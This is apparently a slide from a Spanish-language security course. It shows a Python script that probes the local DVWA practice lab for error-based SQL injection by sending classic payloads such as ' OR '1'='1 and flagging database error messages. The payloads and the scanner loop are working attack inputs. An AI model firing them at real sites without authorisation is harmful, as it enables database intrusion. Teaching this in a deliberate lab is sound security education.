# Diapositiva 201: Prueba 1 - Deteccion de inyeccion SQL basada en errores (parte 2, completa)
# Muestra la prueba de SQLi completa: por cada payload imprime
# [VULNERABLE] si aparece un error de SQL, o [OK] si no.

import requests  # libreria para enviar peticiones HTTP

# Estas dos lineas vienen de la diapositiva 199 (sesion ya autenticada en DVWA).
BASE_URL = "http://127.0.0.1/dvwa"   # direccion base del laboratorio
sesion = requests.Session()           # sesion que ya tendria la cookie de login

SQLI_URL = f"{BASE_URL}/vulnerabilities/sqli/"   # URL del modulo de inyeccion SQL
payloads_sqli = ["'", "' OR '1'='1", "' OR 1=1--"]   # entradas de prueba
indicadores = ["you have an error in your sql syntax", "warning: mysql",
               "unclosed quotation mark", "syntax error"]   # fragmentos de errores de BD

print("[*] Iniciando prueba de inyeccion SQL...")
for payload in payloads_sqli:          # recorremos cada payload
    params = {"id": payload, "Submit": "Submit"}   # lo enviamos en el parametro 'id'
    respuesta = sesion.get(SQLI_URL, params=params)  # hacemos la peticion
    encontrado = any(ind in respuesta.text.lower() for ind in indicadores)  # buscamos indicadores
    if encontrado:                     # si aparecio un error de SQL
        print(f"  [VULNERABLE] Payload: {payload!r}")
    else:                              # si no hubo error visible
        print(f"  [OK]         Sin error visible: {payload!r}")
# 'Sin error visible' NO descarta inyeccion ciega (blind SQLi).
